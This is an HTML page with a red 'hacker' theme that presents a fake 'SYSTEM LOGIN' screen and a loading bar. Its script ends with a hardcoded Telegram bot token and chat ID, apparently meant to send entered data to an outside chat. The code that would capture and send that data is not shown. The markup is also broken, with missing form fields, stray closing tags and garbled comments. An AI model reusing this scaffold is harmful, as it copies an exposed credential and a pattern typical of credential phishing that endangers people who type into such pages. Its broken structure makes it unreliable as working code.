<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

        :root { --red: #ff0000; --dark-red: #440000; --glow: 0 0 15px #ff0000; }

        body { 
            background: #000; 
            color: var(--red); 
            font-family: 'Share Tech Mono', monospace; 
            margin: 0; 
            overflow: hidden; 
            text-transform: uppercase;
        }

        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.5; }

        /* ØªØ£Ø«ÙŠØ± Ø§Ù„Ù…Ø³Ø­ Ø§Ù„Ù„ÙŠØ²Ø±ÙŠ */
        .scanner {
            position: fixed; top: 0; left: 0; width: 100%; height: 5px;
            background: rgba(255, 0, 0, 0.2);
            box-shadow: 0 0 20px var(--red);
            animation: scan 4s linear infinite;
            z-index: -1;
        }
        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }

        .screen { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; position: relative; }
        .active { display: flex !important; }

        /* Ø§Ù„ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ */
        .frame {
            border: 1px solid var(--red);
            background: rgba(0, 0, 0, 0.8);
            padding: 40px;
            position: relative;
            box-shadow: inset 0 0 20px var(--dark-red), var(--glow);
            width: 90%; max-width: 500px;
            clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%);
        }

        /* Ø²ÙˆØ§ÙŠØ§ Ø§Ù„Ø¯ÙŠÙƒÙˆØ± */
        .frame::before {
            content: ""; position: absolute; top: -2px; left: -2px; width: 20px; height: 20px;
            border-top: 3px solid var(--red); border-left: 3px solid var(--red);
        }

        h1 { font-size: 2rem; margin-bottom: 20px; letter-spacing: 10px; text-shadow: var(--glow); }

        input {
            background: transparent; border: 1px solid var(--dark-red); color: #fff;
            padding: 15px; width: 100%; box-sizing: border-box; margin: 20px 0;
            outline: none; transition: 0.3s; font-family: inherit; text-align: center;
        }
        input:focus { border-color: var(--red); box-shadow: inset 0 0 10px var(--dark-red); }

        button {
            background: var(--red); color: #000; border: none; padding: 15px;
            width: 100%; font-weight: bold; cursor: pointer; font-family: inherit;
            letter-spacing: 2px; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
            transition: 0.3s;
        }
        button:hover { background: #fff; transform: scale(1.05); }

        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªØ­Ù…ÙŠÙ„ */
        .loader-wrap { width: 100%; border: 1px solid var(--dark-red); height: 15px; margin: 20px 0; }
        .progress { width: 0%; height: 100%; background: var(--red); transition: 0.5s; }
        
        .status-log { font-size: 10px; color: #888; text-align: left; height: 80px; overflow-y: hidden; line-height: 1.5; }
    </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>
<div class="scanner"></div>

<div id="screen1" class="screen active">
    <div class="frame">
        <h1>SYSTEM LOGIN</h1>
        <p style="font-size: 12px; color: #666;">DECRYPTING GATEWAY...</p>

    </div>
</div>

<div id="screen2" class="screen">

        <div class="loader-wrap"><div id="bar" class="progress"></div></div>
        <div id="status-log" class="status-log"></div>
    </div>
</div>

<script>
    // --- Matrix Background ---
    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const chars = "0101010101ABCDEF".split("");
    const drops = Array(Math.floor(canvas.width/20)).fill(1);
    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#f00"; ctx.font = "15px Arial";
        drops.forEach((y, i) => {
            const text = chars[Math.floor(Math.random()*chars.length)];
            ctx.fillText(text, i*20, y*20);
            if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(draw, 33);

    // --- Logic ---
    const CONFIG = {
        token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
        chatId: "1268323143"
    };

</script>

</html>
